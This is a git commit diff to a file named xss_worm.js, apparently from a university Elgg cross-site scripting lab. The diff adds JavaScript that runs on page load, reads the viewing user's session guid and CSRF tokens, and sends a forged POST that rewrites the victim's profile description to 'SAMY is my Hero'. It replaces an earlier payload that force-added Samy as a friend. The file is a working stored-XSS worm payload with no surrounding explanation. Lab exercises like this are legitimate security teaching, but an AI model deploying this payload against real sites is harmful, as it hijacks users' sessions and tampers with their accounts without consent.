2dbd875cedee6a83d150c6911cd1027f173bd024
Christine Johnson <49726302+christinej697@users.noreply.github.com>
2021-03-25 10:36:31 -0600

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,18 +1,21 @@
-window.onload = function () {
-    var Ajax=null;
+window.onload = function(){
+    var name="&name="+elgg.session.user.name;
+    var guid="&guid="+elgg.session.user.guid;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
 
-    // This data is sent by the server (look at the page's source code!)
-    // and must be included in subsequent requests.
-    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;           // (1) elgg CSRF countermeasure
-    var token="&__elgg_token="+elgg.security.token.__elgg_token;  // (2) elgg CSRF countermeasure
+    var sendurl="http://www.xsslabelgg.com/action/profile/edit";   
 
-    // Construct the HTTP request to add Samy as a friend.
+    var content="&description=SAMY+is+my+Hero"+"&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=" + guid;  
 
-    var sendurl="http://www.xsslabelgg.com/action/friends/add" + "?friend=59" + token + ts;
-
-    Ajax=new XMLHttpRequest();
-    Ajax.open("GET",sendurl,true);
-    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-    Ajax.send();
+    var samyGuid=59;  
+    if (elgg.session.user.guid!=samyGuid)     
+    {
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST",sendurl,true);
+        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
 }
